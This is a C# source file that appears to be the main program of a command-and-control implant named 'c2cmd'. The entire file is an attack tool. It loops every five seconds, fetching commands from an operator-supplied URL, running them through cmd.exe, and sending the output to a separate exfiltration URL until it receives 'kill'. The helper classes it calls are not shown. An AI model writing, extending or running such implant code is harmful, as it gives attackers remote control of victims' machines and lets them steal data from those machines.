using System.Diagnostics;

namespace c2cmd {
    public class Program {
        static void Main(string[] args) {
            if (argParser(args) == 0) {

                using (CmdProcessor cmdService = new CmdProcessor("cmd.exe")) {
                    string consoleCommand = String.Empty;
                    do {
                        Thread.Sleep(5000);
                        consoleCommand = exfil.getCommandAsync();
                        if (!String.IsNullOrEmpty(consoleCommand)) {
                            string output = cmdService.ExecuteCommand(consoleCommand);
                            exfil.exfilData(output);
                            Console.WriteLine("{0}", output);
                        }
                    }
                    while (consoleCommand != "kill");
                }
            }
        }
        private static int argParser(string[] args) {
            for (int i = 0; i < args.Length; i++) {
                var arg = args[i].ToLower();
                if (arg == "--cmdurl") {
                    exfil.cmdCheckUrl = args[i + 1];
                }
                if (arg == "--exfilurl") {
                    exfil.exfilUrl = args[i + 1];
                }
                if (arg == "--clearurl") {
                    exfil.clearCmdUrl = args[i + 1];
                }
            }
            if (string.IsNullOrEmpty(exfil.cmdCheckUrl) || string.IsNullOrEmpty(exfil.clearCmdUrl) ||
                    string.IsNullOrEmpty(exfil.exfilUrl)) {
                Console.WriteLine("usage:" + Environment.NewLine + Process.GetCurrentProcess().MainModule.ModuleName + " --cmdurl <URL> --exfilurl <URL> --clearurl <URL>");
                return -1;
            }
            return 0;
        }
    }
}